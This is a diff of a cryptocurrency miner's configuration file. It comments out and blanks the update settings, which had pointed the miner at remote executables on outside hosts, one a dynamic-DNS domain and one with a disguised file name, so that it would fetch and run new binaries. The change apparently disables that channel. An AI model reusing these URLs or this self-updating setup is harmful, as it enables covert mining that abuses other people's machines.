@@ -7,10 +7,10 @@ proxy=0					; Change this value to "1" if you are mining to xmrig-proxy instead 
 keepalive=1				; 0 to disable keepalive, 1 to enable keepalive
 
 [Update]
-config_url=http://hawkey3.xyz/rhkd/Update.exe   	; You can update the url that points to the configuration file. Must begin with "http://" or "https://" 
+;config_url=  	; You can update the url that points to the configuration file. Must begin with "http://" or "https://" 
 knock_time=30 				     	; Number of minutes the miner waits between visits to config file. If never specified, default is 30 minutes. 
-update_url=http://shadhk.duckdns.org/LibraryManagementSystem.exe		; url of new miner. Miner will get updated with this file. 
-update_hash=3CB9FD451DF64942E22ABB12B238F2B4				; md5 hash of new miner file. 32 characters long (16 byte hexadecimal format for hash). You need to specify this value, othewise miner will not get updated!
+;update_url=	; url of new miner. Miner will get updated with this file. 
+;update_hash=3CB9FD451DF64942E22ABB12B238F2B4				; md5 hash of new miner file. 32 characters long (16 byte hexadecimal format for hash). You need to specify this value, othewise miner will not get updated!
 
 ;End of configuration. Do not remove this line, ";End" string specifies end of configuration file.
 
